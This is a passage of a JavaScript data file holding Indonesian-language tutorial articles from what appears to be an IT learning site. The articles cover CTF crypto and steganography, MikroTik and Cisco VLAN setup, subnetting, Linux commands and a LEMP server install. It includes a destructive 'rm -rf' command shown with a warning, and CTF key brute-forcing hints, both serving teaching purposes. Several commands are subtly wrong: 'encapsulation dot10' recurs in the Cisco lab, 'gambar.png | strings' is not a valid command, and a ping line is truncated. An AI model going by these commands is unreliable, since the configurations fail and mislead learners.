          "# XOR enkripsi & dekripsi (prosesnya sama!)\ndef xor_bytes(data, key):\n    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])\n\nplaintext = b\"flag{crypto_is_fun}\"\nkey = b\"secret\"\nencrypted = xor_bytes(plaintext, key)\nprint(\"encrypted:\", encrypted.hex())\n\n# dekripsi: XOR lagi dengan key yang sama\nprint(\"decrypted:\", xor_bytes(encrypted, key))"
        ) +
        '<h2 id="xor-brute">4. XOR dengan Key Pendek (Brute Force)</h2>' +
        "<p>CTF sering memakai XOR single-byte. Kita bisa coba semua 256 kemungkinan key dan pilih hasil yang mengandung string seperti <code>flag{</code>:</p>" +
        codeBlock(
          "python",
          "# xor single byte brute force\nenc = bytes.fromhex(\"0a060d1c0100\")  # contoh hasil hex\nfor k in range(256):\n    dec = bytes([b ^ k for b in enc])\n    if b\"flag\" in dec:\n        print(\"key:\", hex(k), \"→\", dec)"
        ) +
        callout(
          "tip",
          "Kalau ketemu file XOR di CTF, periksa dulu apakah key-nya berulang atau single-byte. Tool <strong>xortool</strong> bisa menebak panjang dan isi key secara otomatis: <code>xortool -c all file.bin</code>.",
          "TIPS"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Caesar mengajarkan kita brute force pada ruang kunci kecil, sementara XOR mengajarkan sifat dasar operasi bitwise yang menjadi fondasi banyak sistem kripto modern. Kuasai keduanya sebelum melanjutkan ke AES/RSA di level berikutnya.</p>" +
        "<p>Hal penting yang harus diingat:</p>" +
        "<ul>" +
        "<li><strong>Caesar cipher</strong> — geser alfabet, hanya 25 kemungkinan kunci, mudah dipecah dengan frekuensi huruf</li>" +
        "<li><strong>XOR</strong> — <code>A ^ K = B</code>, maka <code>B ^ K = A</code>; kunci dipakai ulang membuat pola (one-time pad aman bila kunci sepanjang pesan)</li>" +
        "<li><strong>Enkripsi ≠ autentikasi</strong> — pesan terenkripsi belum tentu dari pihak yang benar</li>" +
        "<li>Untuk AES/RSA nanti, kuncinya tetap pada pengelolaan kunci yang aman</li>" +
        "</ul>",
    },

    "steganografi-binwalk-steghide": {
      id: "steganografi-binwalk-steghide",
      crumb: "Ekstraksi Pesan Tersembunyi",
      title: "Steganografi CTF: Ekstraksi Pesan Tersembunyi dengan Binwalk & Steghide",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Pelajari cara mendeteksi dan mengekstrak data tersembunyi di dalam file gambar/audio menggunakan binwalk, steghide, strings, dan exiftool.",
      date: "2026-10-04",
      readTime: 13,
      lab: "Kali Linux (binwalk, steghide, zsteg)",
      author: "Admin KBHub",
      tags: ["steganography", "ctf", "forensics", "binwalk"],
      content:
        '<h2 id="konsep-stego">Apa itu Steganografi?</h2>' +
        "<p><strong>Steganografi</strong> menyembunyikan keberadaan pesan (bukan mengenkripsinya) di dalam medium lain seperti gambar, audio, atau dokumen PDF. Berbeda dari kriptografi yang membuat data tidak terbaca, steganografi membuat data <em>tidak terlihat ada</em>.</p>" +
        '<h2 id="recon-file">1. Recon Awal: File &amp; Metadata</h2>' +
        "<p>Sebelum pakai tool berat, selalu mulai dari yang sederhana — periksa metadata dan strings:</p>" +
        codeBlock(
          "bash",
          "# cek tipe file sebenarnya (jangan percaya ekstensi)\nfile gambar.png\n# gambar.png: PNG image data, 800 x 600, 8-bit/color RGBA\n\n# baca metadata EXIF\nexiftool gambar.png\n# Comment : flag mungkin di sini\n# Software: steghide 0.5.1\n\n# cari string mencurigakan\ngambar.png | strings | grep -iE \"flag|password|key\""
        ) +
        callout(
          "note",
          "Metadata sering menyimpan <strong>jejak tool</strong> yang dipakai (mis. <code>Software: steghide</code>). Petunjuk ini menentukan tool ekstraksi berikutnya yang harus kamu coba."
        ) +
        '<h2 id="binwalk">2. Binwalk: Deteksi File Tersemat</h2>' +
        "<p><code>binwalk</code> memindai file dan mendeteksi apakah ada file lain (zip, gambar, ELF) yang tertanam di dalamnya:</p>" +
        codeBlock(
          "bash",
          "# scan file untuk menemukan file tersembunyi\nbinwalk gambar.png\n# DECIMAL       HEXADECIMAL     DESCRIPTION\n# 0             0x0             PNG image, 800 x 600\n# 8243          0x2033          Zip archive data\n\n# ekstrak otomatis hasil temuan\nbinwalk -e gambar.png\n# hasil ekstraksi ada di folder _gambar.png.extracted/"
        ) +
        '<h2 id="steghide">3. Steghide: Pesan dengan Password</h2>' +
        "<p><code>steghide</code> menyisipkan/mengekstrak data ke gambar (JPEG/BMP) atau audio (WAV/AU) dengan proteksi password:</p>" +
        codeBlock(
          "bash",
          "# ekstrak data tersembunyi dari gambar\nsteghide extract -sf gambar.jpg\n# Enter passphrase: (kosong jika tanpa password)\n# jika benar → file 'secret.txt' ditulis ke direktori\n\n# dengan password tertentu\nsteghide extract -sf gambar.jpg -p \"password123\"\n\n# cek kapasitas penyisipan\nsteghide info gambar.jpg"
        ) +
        callout(
          "warning",
          "Jika diminta passphrase dan tidak ada petunjuk, coba wordlist umum CTF (<code>rockyou.txt</code>) atau password dari petunjuk soal. Steghide <strong>tidak</strong> bisa dibobol tanpa password yang benar.",
          "PERINGATAN"
        ) +
        '<h2 id="zsteg-lainnya">4. Tool Lain: zsteg, outguess, stegsolve</h2>' +
        "<ul>" +
        "<li><strong>zsteg</strong> — khusus PNG/BMP, mendeteksi pesan di bit planes (atas/bawah, RGB)</li>" +
        "<li><strong>outguess</strong> — alternatif steghide dengan algoritme berbeda</li>" +
        "<li><strong>stegsolve</strong> — GUI untuk menvisualisasikan perbedaan bit plane gambar</li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# zsteg: deteksi pesan tersembunyi di PNG\nzsteg gambar.png\n# text: \"flag{h1dden_1n_pl4in_s1ght}\"\n\n# cek semua kombinasi bit plane\nzsteg -a gambar.png"
        ) +
        '<h2 id="alur-kerja">5. Alur Kerja yang Disarankan</h2>' +
        "<ol>" +
        "<li><code>file</code> + <code>exiftool</code> — identifikasi tipe asli & metadata</li>" +
        "<li><code>strings</code> + <code>grep</code> — cari teks polos yang tersembunyi</li>" +
        "<li><code>binwalk -e</code> — ekstrak file yang tertanam</li>" +
        "<li><code>steghide</code>/<code>zsteg</code>/<code>outguess</code> — ekstrak berdasarkan jenis medium</li>" +
        "</ol>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Steganografi di CTF jarang butuh tool canggih — kuncinya <strong>metodologi</strong>: kenali mediumnya, cek metadata, lalu pilih tool ekstraksi yang tepat. Latih pola pikir ini pada soal forensics di CTF favoritmu.</p>" +
        callout(
          "tip",
          "Kumpulkan soal steganografi dari CTF seperti <strong>picoCTF</strong> (kategori Forensics) — mulai dari yang mudah sampai butuh kombinasi beberapa tool sekaligus.",
          "LATIHAN"
        ),
    },

    "networking-mikrotik-basic": {
      id: "networking-mikrotik-basic",
      crumb: "Konfigurasi Dasar MikroTik",
      title: "Konfigurasi Dasar MikroTik: IP Address, DHCP Server, dan NAT Gateway",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Panduan langkah demi langkah menyiapkan router MikroTik dari nol: alamat IP antarmuka, DHCP Server untuk klien, hingga NAT masquerade agar semua host bisa internet.",
      date: "2026-10-09",
      readTime: 12,
      lab: "MikroTik CHR / RB951Ui-2HnD",
      author: "Admin KBHub",
      tags: ["mikrotik", "routeros", "dhcp", "nat"],
      content:
        '<h2 id="persiapan">1. Persiapan &amp; Akses Awal</h2>' +
        "<p>RouterOS bisa dikonfigurasi lewat <strong>Winbox</strong> (GUI), <strong>WebFig</strong>, atau <strong>CLI</strong>. Untuk pemula, Winbox paling nyaman — cukup klik MAC address router dari daftar neighbours. Contoh di bawah memakai sintaks CLI yang bisa langsung ditempel di terminal MikroTik.</p>" +
        codeBlock(
          "bash",
          "# masuk ke mode CLI via ssh\nssh admin@192.168.88.1\n\n# identitas router (agar mudah dikenali)\n/system identity set name=\"Gateway-Kantor\"\n\n# cek versi RouterOS\n/system resource print"
        ) +
        '<h2 id="ip-address">2. Memberi Alamat IP Address</h2>' +
        "<p>Setiap interface butuh alamat IP. Pola yang umum: satu interface untuk <strong>WAN</strong> (internet) dan satu untuk <strong>LAN</strong>.</p>" +
        codeBlock(
          "bash",
          "# lihat daftar interface\n/interface print\n\n# beri IP di interface LAN (ether2)\n/ip address add address=192.168.10.1/24 interface=ether2\n\n# beri IP di interface WAN (ether1) — sesuaikan ISP\n/ip address add address=192.168.100.2/24 interface=ether1\n\n# verifikasi\n/ip address print"
        ) +
        callout(
          "note",
          "Gunakan CIDR yang benar. <code>192.168.10.1/24</code> berarti mask <code>255.255.255.0</code> dengan 254 host tersedia. Salah tulis /24 jadi /16 akan membuat broadcast domain melebar tak terkendali."
        ) +
        '<h2 id="dhcp-server">3. DHCP Server untuk Klien</h2>' +
        "<p>Agar klien LAN tidak perlu set IP manual, aktifkan DHCP Server. Wizard bawaan membuat seluruh konfigurasi sekaligus: address pool, network, dan lease.</p>" +
        codeBlock(
          "bash",
          "# jalankan wizard DHCP\n/ip dhcp-server setup\n#   dhcp interface     -> ether2\n#   address space       -> 192.168.10.0/24\n#   gateway            -> 192.168.10.1\n#   addresses to give  -> 192.168.10.10-192.168.10.100\n#   dns servers        -> 1.1.1.1, 8.8.8.8\n#   lease time         -> 3d\n\n# cek status lease klien\n/ip dhcp-server lease print"
        ) +
        '<h2 id="nat-gateway">4. NAT Masquerade (Akses Internet)</h2>' +
        "<p>Tanpa NAT, host dengan IP privat (192.168.x.x) tidak bisa mencapai internet. <strong>Masquerade</strong> mengganti IP sumber paket keluar dengan IP publik router.</p>" +
        codeBlock(
          "bash",
          "/ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade comment=\"ke internet\"\n\n# pastikan firewall mengizinkan traffic forward & input\n/ip firewall filter print\n/ip firewall filter add chain=input connection-state=established,related action=accept comment=\"izinkan reply\"\n/ip firewall filter add chain=input in-interface=ether1 connection-state=new action=drop comment=\"blok WAN langsung\""
        ) +
        '<h2 id="dns-gateway">5. DNS &amp; Default Gateway</h2>' +
        codeBlock(
          "bash",
          "# agar router ikut bisa resolve nama domain\n/ip dns set servers=1.1.1.1,8.8.8.8 allow-remote-requests=yes\n\n# gateway default (via ISP)\n/ip route add dst-address=0.0.0.0/0 gateway=192.168.100.1\n\n# tes dari router itu sendiri\ning 8.8.8.8\ndig google.com"
        ) +
        '<h2 id="verifikasi">6. Verifikasi Akhir</h2>' +
        "<p>Uji berjenjang agar mudah mendiagnosa ketika ada masalah:</p>" +
        "<ol>" +
        "<li>Ping gateway lokal dari klien → memastikan jalur LAN OK</li>" +
        "<li>Ping IP publik (<code>8.8.8.8</code>) → memastikan routing &amp; NAT jalan</li>" +
        "<li>Ping nama domain (<code>google.com</code>) → memastikan DNS jalan</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# dari PC klien (192.168.10.10)\nping 192.168.10.1      # gateway\nping 8.8.8.8           # internet (tanpa DNS)\nping google.com        # internet + DNS\nipconfig /all          # pastikan gateway & DNS benar (Windows)"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Konfigurasi inti MikroTik selalu berputar pada empat hal: <strong>IP address</strong> (identitas antarmuka), <strong>DHCP</strong> (distribusi ke klien), <strong>NAT</strong> (jembatan ke internet), dan <strong>firewall</strong> (perlindungan). Kuasai empat hal ini dan hampir seluruh skenario jaringan kecil bisa diselesaikan.</p>" +
        callout(
          "tip",
          "Simpan konfigurasi yang sudah jalan dengan <code>/system backup save</code> dan ekspor settings via <code>/export file=backup-kantor</code>. Jika router rusak, konfigurasi bisa dipulihkan dalam hitungan menit.",
          "TIPS"
        ),
    },

    "networking-subnetting-guide": {
      id: "networking-subnetting-guide",
      crumb: "Panduan Subnetting IPv4",
      title: "Panduan Subnetting IPv4 Lengkap: Menghitung CIDR, Subnet Mask, & Host",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Penjelasan subnetting dari konsep biner hingga perhitungan CIDR, jumlah host, dan broadcast address — lengkap dengan rumus cepat dan tabel referensi.",
      date: "2026-10-03",
      readTime: 14,
      lab: "Kalkulator + Cisco Packet Tracer",
      author: "Admin KBHub",
      tags: ["subnetting", "ipv4", "cidr", "networking"],
      content:
        '<h2 id="kenapa-subnetting">1. Kenapa Subnetting Penting?</h2>' +
        "<p><strong>Subnetting</strong> membagi satu jaringan besar menjadi beberapa segmen kecil (subnet). Manfaatnya: membatasi broadcast, mempermudah manajemen, dan menerapkan kebijakan keamanan per segmen — misalnya memisahkan VLAN tamu dari VLAN server.</p>" +
        '<h2 id="anatomi-ip">2. Anatomi Alamat IP &amp; CIDR</h2>' +
        "<p>Alamat IP terdiri dari 32 bit, ditulis 4 oktet desimal. Notasi <strong>CIDR</strong> (<code>/24</code>) menunjukkan berapa bit yang dipakai untuk <em>network portion</em>. Sisa bit = <em>host portion</em>.</p>" +
        codeBlock(
          "bash",
          "# contoh\nIP        : 192.168.10.57\nCIDR      : /26\nMask      : 255.255.255.192\n\n# /26 → 26 bit network, 6 bit host\n# jumlah host = 2^6 - 2 = 62 host (kurangi network & broadcast)"
        ) +
        '<h2 id="rumus">3. Rumus Cepat Subnetting</h2>' +
        '<table><thead><tr><th>Yang dihitung</th><th>Rumus</th></tr></thead><tbody>' +
        "<tr><td>Jumlah subnet</td><td><code>2^(s)</code>, s = bit subnet yang dipinjam</td></tr>" +
        "<tr><td>Jumlah host per subnet</td><td><code>2^h - 2</code>, h = sisa bit host</td></tr>" +
        "<tr><td>Block size (interval)</td><td><code>256 - oktet mask terakhir</code></td></tr>" +
        "<tr><td>Broadcast address</td><td>alamat berikutnya setelah range host terakhir</td></tr>" +
        "<tr><td>Network address</td><td>IP pertama yang habis dibagi block size</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "bash",
          "# contoh cepat: 192.168.10.0/26\n# block size = 256 - 192 = 64\n# subnet : .0, .64, .128, .192\n# subnet ke-3 (192.168.10.128):\n#   network   = 192.168.10.128\n#   host      = .129 - .190\n#   broadcast = 192.168.10.191"
        ) +
        '<h2 id="tabel-cidr">4. Tabel Referensi CIDR Umum</h2>' +
        '<table><thead><tr><th>CIDR</th><th>Mask</th><th>Host</th><th>Gunanya</th></tr></thead><tbody>' +
        "<tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Jaringan kantor kecil</td></tr>" +
        "<tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>Belah 2 segmen</td></tr>" +
        "<tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>VLAN per divisi</td></tr>" +
        "<tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>Segmen kecil / server</td></tr>" +
        "<tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Point-to-point / IoT</td></tr>" +
        "<tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Link antar router</td></tr>" +
        "</tbody></table>" +
        '<h2 id="contoh-kasus">5. Studi Kasus</h2>' +
        "<p>Sebuah kantor punya jaringan <code>10.10.0.0/22</code> dan ingin dibagi menjadi 4 VLAN dengan jumlah host berbeda. Tentukan penomoran paling efisien:</p>" +
        codeBlock(
          "python",
          "# hitung subnet otomatis dengan Python\ndef subnet_calc(base, cidr):\n    import ipaddress\n    net = ipaddress.ip_network(f\"{base}/{cidr}\", strict=False)\n    print(\"Network :\", net)\n    print(\"Mask    :\", net.netmask)\n    print(\"Host    :\", net.num_addresses - 2)\n    print(\"Range   :\", net[1], \"-\", net[-2])\n    print(\"Broadcast:\", net.broadcast_address)\n\nsubnet_calc(\"10.10.0.0\", 22)\n# Network : 10.10.0.0/22\n# Mask    : 255.255.252.0\n# Host    : 1022"
        ) +
        callout(
          "note",
          "Tools pendukung saat mengerjakan soal: <code>ipcalc</code> di Linux, <code>subnetting.com</code>, atau Cisco <code>ip subnet-zero</code>. Namun tetap kuasai perhitungan manual — di ujian dan interview teknis, kalkulator sering tidak diperbolehkan."
        ) +
        '<h2 id="latihan">6. Latihan Mandiri</h2>' +
        "<ul>" +
        "<li>Berapa host tersedia pada <code>172.16.5.0/28</code>?</li>" +
        "<li>Range host untuk subnet kedua dari <code>192.168.100.0/25</code>?</li>" +
        "<li>Berapa subnet yang terbentuk jika <code>/24</code> dipinjam 3 bit?</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Subnetting bukan hafalan, melainkan <strong>pola berpikir biner</strong>. Kuasai rumus block size dan <code>2^h - 2</code>, lalu berlatih dengan timer — targetkan mengerjakan soal subnetting dalam hitungan detik seperti yang dituntut di sertifikasi jaringan.</p>" +
        callout(
          "tip",
          "Naik level: pelajari <strong>VLSM</strong> (Variable Length Subnet Mask) untuk membagi subnet dengan ukuran berbeda dalam satu blok besar tanpa membuang alamat IP.",
          "LATIHAN"
        ),
    },

    "networking-cisco-vlan-routing": {
      id: "networking-cisco-vlan-routing",
      crumb: "VLAN & Inter-VLAN Routing",
      title: "Konfigurasi VLAN & Inter-VLAN Routing di Cisco Packet Tracer",
      category: "networking",
      difficulty: "Intermediate",
      excerpt:
        "Praktik lengkap membagi jaringan ke dalam VLAN di switch Cisco, mengonfigurasi trunk 802.1Q, dan inter-VLAN routing dengan metode router-on-a-stick.",
      date: "2026-09-28",
      readTime: 15,
      lab: "Cisco Packet Tracer 8.x",
      author: "Admin KBHub",
      tags: ["cisco", "vlan", "trunk", "packet-tracer"],
      content:
        callout(
          "note",
          "Lab ini memakai <strong>Cisco Packet Tracer</strong>. Perangkat yang dipakai: 1 switch Cisco 2960, 1 router Cisco 2811/4321, 2 PC, dan 1 server. Topologi: PC1 (VLAN 10) &amp; PC2 (VLAN 20) terhubung ke switch, switch ke router via trunk."
        ) +
        '<h2 id="konsep-vlan">1. Konsep VLAN</h2>' +
        "<p><strong>VLAN</strong> (Virtual LAN) memisahkan broadcast domain secara logis tanpa mengubah fisik kabel. Port pada VLAN berbeda tidak bisa saling berkomunikasi langsung — dibutuhkan <strong>router</strong> atau <strong>L3 switch</strong> (inter-VLAN routing).</p>" +
        '<h2 id="membuat-vlan">2. Membuat VLAN di Switch</h2>' +
        codeBlock(
          "bash",
          "Switch> enable\nSwitch# configure terminal\n\n! buat VLAN 10 (Sales) dan VLAN 20 (Keuangan)\nSwitch(config)# vlan 10\nSwitch(config-vlan)# name Sales\nSwitch(config-vlan)# exit\nSwitch(config)# vlan 20\nSwitch(config-vlan)# name Keuangan\nSwitch(config-vlan)# exit\n\n! masukkan access port ke VLAN\nSwitch(config)# interface fastEthernet 0/1\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10\nSwitch(config-if)# exit\nSwitch(config)# interface fastEthernet 0/2\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 20\nSwitch(config-if)# exit\n\n! verifikasi\nSwitch# show vlan brief"
        ) +
        '<h2 id="trunk">3. Konfigurasi Trunk (802.1Q)</h2>' +
        "<p>Agar link ke router bisa membawa traffic banyak VLAN sekaligus, port dijadikan <strong>trunk</strong> dengan encapsulation IEEE 802.1Q.</p>" +
        codeBlock(
          "bash",
          "Switch(config)# interface gigabitEthernet 0/1\nSwitch(config-if)# switchport mode trunk\nSwitch(config-if)# switchport trunk encapsulation dot1q\nSwitch(config-if)# switchport trunk allowed vlan 10,20\nSwitch(config-if)# exit\n\n! verifikasi status trunk\nSwitch# show interfaces trunk"
        ) +
        callout(
          "warning",
          "Jika perangkat hanya mendukung satu encapsulation, perintah <code>switchport trunk encapsulation</code> bisa gagal atau tidak diperlukan. Pada switch Layer 3 tertentu perintah ini wajib diisi sebelum <code>switchport mode trunk</code>."
        ) +
        '<h2 id="router-on-stick">4. Inter-VLAN Routing: Router-on-a-Stick</h2>' +
        "<p>Satu interface router dibuat <strong>sub-interface</strong> per VLAN. Setiap sub-interface menjadi gateway untuk VLAN tersebut dan wajib diberi tag 802.1Q.</p>" +
        codeBlock(
          "bash",
          "Router> enable\nRouter# configure terminal\n\n! aktifkan interface fisik ke switch\nRouter(config)# interface gigabitEthernet 0/0\nRouter(config-if)# no shutdown\nRouter(config-if)# exit\n\n! sub-interface untuk VLAN 10\nRouter(config)# interface gigabitEthernet 0/0.10\nRouter(config-subif)# encapsulation dot10 10\nRouter(config-subif)# ip address 192.168.10.1 255.255.255.0\nRouter(config-subif)# exit\n\n! sub-interface untuk VLAN 20\nRouter(config)# interface gigabitEthernet 0/0.20\nRouter(config-subif)# encapsulation dot10 20\nRouter(config-subif)# ip address 192.168.20.1 255.255.255.0\nRouter(config-subif)# exit\n\nRouter(config)# ip routing   ! aktifkan routing (jika L3)"
        ) +
        '<h2 id="ip-host">5. IP PC &amp; Gateway</h2>' +
        codeBlock(
          "bash",
          "# PC1 (VLAN 10)\nIP Address  : 192.168.10.10\nSubnet Mask : 255.255.255.0\nGateway     : 192.168.10.1\n\n# PC2 (VLAN 20)\nIP Address  : 192.168.20.10\nSubnet Mask : 255.255.255.0\nGateway     : 192.168.20.1"
        ) +
        '<h2 id="verifikasi">6. Verifikasi &amp; Troubleshooting</h2>' +
        codeBlock(
          "bash",
          "# tes dari PC1 ke PC2 (harus BERHASIL karena beda VLAN, lewat router)\nping 192.168.20.10\n\n# periksa tabel routing router\nRouter# show ip route\n# C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.10\n# C    192.168.20.0/24 is directly connected, GigabitEthernet0/0.20\n\n# periksa trunk & vlan di switch\nSwitch# show interfaces trunk\nSwitch# show vlan brief"
        ) +
        '<h2 id="pencegahan">7. Troubleshooting Umum</h2>' +
        "<ul>" +
        "<li>Ping gagal antar VLAN → cek apakah <code>encapsulation dot10</code> sudah benar dan sub-interface <code>no shutdown</code></li>" +
        "<li>Trunk tidak muncul → pastikan kedua sisi sama-sama <code>switchport mode trunk</code></li>" +
        "<li>PC tidak dapat IP → cek DHCP scope di router atau set statis sesuai subnet VLAN-nya</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola dasar inter-VLAN selalu sama: <strong>buat VLAN</strong> → <strong>tetapkan access port</strong> → <strong>trunk ke router</strong> → <strong>sub-interface + IP gateway per VLAN</strong>. Setelah paham pola ini, kamu bisa menerapkannya ke metode lain seperti SVI pada L3 switch atau routing terintegrasi.</p>" +
        callout(
          "tip",
          "Perluas lab: tambahkan VLAN 30 (Guest) yang hanya boleh mengakses internet, lalu buktikan isolasi dari VLAN 10/20 dengan uji ping ke masing-masing gateway.",
          "LATIHAN"
        ),
    },

    "linux-essential-commands": {
      id: "linux-essential-commands",
      crumb: "Perintah Dasar Terminal",
      title: "Cheat Sheet Perintah Dasar Terminal Linux untuk Pemula",
      category: "linux",
      difficulty: "Beginner",
      excerpt:
        "Kumpulan perintah wajib untuk pemula Linux: navigasi filesystem, manajemen file, izin akses, monitoring proses, hingga jaringan — disusun sebagai cheat sheet cepat.",
      date: "2026-10-07",
      readTime: 11,
      lab: "Ubuntu 22.04 / Debian (Terminal)",
      author: "Admin KBHub",
      tags: ["linux", "terminal", "cheatsheet", "bash"],
      content:
        '<h2 id="navigasi">1. Navigasi Filesystem</h2>' +
        codeBlock(
          "bash",
          "pwd                   # tampilkan direktori kerja saat ini\nls -lah               # daftar file (lengkap, human-readable, termasuk hidden)\ncd /var/log           # pindah ke path absolut\ncd ..                 # naik satu level\ncd -                  # kembali ke direktori sebelumnya\nfind / -name \"*.conf\" 2>/dev/null   # cari file berdasarkan nama\nwhich nginx            # lokasi executable dalam PATH"
        ) +
        '<h2 id="file">2. Manajemen File &amp; Direktori</h2>' +
        codeBlock(
          "bash",
          "mkdir -p project/src   # buat direktori bertingkat\ncp -r backup/ backup2/  # salin folder beserta isinya\nmv lama.txt baru.txt     # rename / pindah file\nrm -i file.txt           # hapus dengan konfirmasi\nrm -rf folder/           # hapus folder rekursif (HATI-HATI)\ntouch notes.txt          # buat file kosong\nln -s /opt/app app       # buat symbolic link\nchmod 644 file.txt       # rw-r--r--\nchown user:group file.txt"
        ) +
        callout(
          "warning",
          "<code>rm -rf</code> tidak memindahkan ke trash — file hilang permanen. Selalu cek ulang path sebelum mengeksekusi, terutama saat memakai wildcard atau variabel seperti <code>rm -rf $DIR/</code>."
        ) +
        '<h2 id="baca-tulis">3. Membaca &amp; Menyaring Isi File</h2>' +
        codeBlock(
          "bash",
          "cat file.txt            # tampilkan seluruh isi\nless big.log            # baca per layar (q untuk keluar)\ntail -f /var/log/syslog  # pantau log secara real-time\ngrep -rni \"error\" .      # cari teks (recursive, case-insensitive)\nhead -n 20 file.txt      # 20 baris pertama\nwc -l file.txt           # hitung jumlah baris\ncut -d: -f1 /etc/passwd  # ambil kolom tertentu"
        ) +
        '<h2 id="proses">4. Monitoring Proses &amp; Sistem</h2>' +
        codeBlock(
          "bash",
          "top                     # proses real-time (q untuk keluar)\nhtop                    # versi top yang lebih ramah\nps aux | grep nginx     # cari proses tertentu\nkill -9 <PID>            # paksa hentikan proses\ndf -h                   # sisa kapasitas disk\ndu -sh *                # ukuran folder per item\nfree -h                 # penggunaan RAM\nuptime                  # load average sistem"
        ) +
        '<h2 id="jaringan">5. Perintah Jaringan</h2>' +
        codeBlock(
          "bash",
          "ip a                    # tampilkan interface & IP (pengganti ifconfig)\nip r                    # tabel routing\nping -c 4 8.8.8.8       # tes konektivitas (4 paket)\nss -tulpn               # port yang listening (pengganti netstat)\ncurl -I https://site.com # cek header respons HTTP\ntraceroute site.com      # jalur paket ke tujuan\nssh user@192.168.1.10    # remote shell"
        ) +
        '<h2 id="sudo">6. Sudo, Service &amp; Paket</h2>' +
        codeBlock(
          "bash",
          "sudo <perintah>          # jalankan sebagai root\nsudo -i                  # buka shell root\ndpkg -i package.deb      # instal paket lokal (Debian/Ubuntu)\napt update && apt upgrade # update repositori + paket\nsystemctl status nginx   # status service\nsystemctl restart nginx  # restart service\nsystemctl enable nginx   # aktifkan saat boot"
        ) +
        '<h2 id="shortcut">7. Shortcut Terminal yang Mempercepat</h2>' +
        '<table><thead><tr><th>Shortcut</th><th>Fungsi</th></tr></thead><tbody>' +
        "<tr><td><code>Tab</code></td><td>Autocomplete path &amp; perintah</td></tr>" +
        "<tr><td><code>Ctrl+C</code></td><td>Batalkan perintah berjalan</td></tr>" +
        "<tr><td><code>Ctrl+R</code></td><td>Cari riwayat perintah secara backwards</td></tr>" +
        "<tr><td><code>Ctrl+L</code></td><td>Bersihkan layar</td></tr>" +
        "<tr><td><code>!!</code></td><td>Ulangi perintah terakhir</td></tr>" +
        "<tr><td><code>history</code></td><td>Lihat daftar riwayat perintah</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Tidak perlu menghafal semuanya sekaligus. Mulai dari tujuh kelompok ini — <strong>navigasi, file, baca, proses, jaringan, sudo, shortcut</strong> — lalu gunakan sehari-hari sampai jadi refleks. Cheat sheet ini paling berguna dicetak atau disimpan di tab terpisah saat kamu praktik.</p>" +
        "<p>Ringkasan perintah wajib per kelompok:</p>" +
        "<ul>" +
        "<li><strong>Navigasi:</strong> <code>pwd</code>, <code>ls -lah</code>, <code>cd</code></li>" +
        "<li><strong>File:</strong> <code>cp</code>, <code>mv</code>, <code>rm</code>, <code>mkdir</code></li>" +
        "<li><strong>Baca:</strong> <code>cat</code>, <code>less</code>, <code>head/tail</code></li>" +
        "<li><strong>Proses:</strong> <code>ps aux</code>, <code>top</code>, <code>kill</code></li>" +
        "<li><strong>Jaringan:</strong> <code>ip a</code>, <code>ss -tulnp</code>, <code>curl</code></li>" +
        "<li><strong>Sudo:</strong> <code>sudo</code>, <code>su -</code></li>" +
        "<li><strong>Shortcut:</strong> <code>Ctrl+C</code>, <code>Ctrl+R</code>, <code>Tab</code>, <code>history</code></li>" +
        "</ul>" +
        callout(
          "tip",
          "Setiap perintah punya manual interaktif: jalankan <code>man chmod</code> atau <code>chmod --help</code> untuk melihat semua opsi dan contoh penggunaannya.",
          "TIPS"
        ),
    },

    "linux-webserver-nginx-php": {
      id: "linux-webserver-nginx-php",
      crumb: "Setup Nginx + PHP-FPM",
      title: "Cara Setup Web Server Nginx + PHP-FPM + MySQL di Ubuntu Server",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap membangun stack LEMP (Linux, Nginx, MySQL, PHP) dari nol di Ubuntu Server, termasuk konfigurasi virtual host, PHP-FPM pool, dan hardening dasar.",
      date: "2026-09-30",
      readTime: 16,
      lab: "Ubuntu Server 24.04 LTS (VM / VPS)",
      author: "Admin KBHub",
      tags: ["nginx", "php", "mysql", "lemp"],
      content:
        callout(
          "note",
          "Stack yang dibangun: <strong>LEMP</strong> (Linux + Nginx + MySQL/MariaDB + PHP-FPM). Semua perintah dijalankan sebagai user dengan hak <code>sudo</code> pada Ubuntu Server 22.04/24.04."
        ) +
        '<h2 id="update">1. Update Sistem &amp; Instal Paket</h2>' +
        codeBlock(
          "bash",
          "sudo apt update && sudo apt upgrade -y\n\n# instal Nginx, MySQL server, dan PHP beserta modul umum\nsudo apt install -y nginx mysql-server php-fpm php-mysql \\\n  php-curl php-gd php-mbstring php-xml php-zip php-bcmath"
        ) +
        '<h2 id="mysql">2. Amankan MySQL</h2>' +
        codeBlock(
          "bash",
          "sudo mysql_secure_installation\n#   Validate password component? Y\n#   Policy: STRONG\n#   Remove anonymous users? Y\n#   Disallow root login remotely? Y\n#   Remove test database? Y\n\n# buat database & user khusus aplikasi\nsudo mysql\nCREATE DATABASE appdb CHARACTER SET utf8mb4;\nCREATE USER 'appuser'@'localhost' IDENTIFIED BY 'KuatS4ngat!';\nGRANT ALL PRIVILEGES ON appdb.* TO 'appuser'@'localhost';\nFLUSH PRIVILEGES;\nEXIT;"
        ) +
        '<h2 id="php-fpm">3. Konfigurasi PHP-FPM</h2>' +
